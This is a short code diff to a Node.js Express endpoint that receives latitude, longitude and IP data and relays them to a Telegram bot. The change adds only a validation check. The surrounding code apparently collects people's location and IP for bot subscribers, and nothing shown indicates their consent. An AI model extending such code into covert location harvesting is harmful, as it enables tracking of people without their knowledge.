@@ -171,6 +171,11 @@ app.post('/submitLocation', upload.none(), async (req, res) => {
     const longitude = req.body.longitude;
     const additionalData = JSON.parse(req.body.additionalData || '{}');
 
+    if (!chatId) {
+        console.error('No chat ID received');
+        return res.status(400).json({ error: 'No chat ID received' });
+    }
+
     if (!latitude || !longitude) {
         console.error('No location data received');
         return res.status(400).json({ error: 'No location data received' });
@@ -197,6 +202,7 @@ IP: ${additionalData.ip}
         res.status(500).json({ error: 'Failed to send location message' });
     }
 });
+
 
 // أوامر البوت
 bot.onText(/\/subscribe (\d+)/, (msg, match) => {
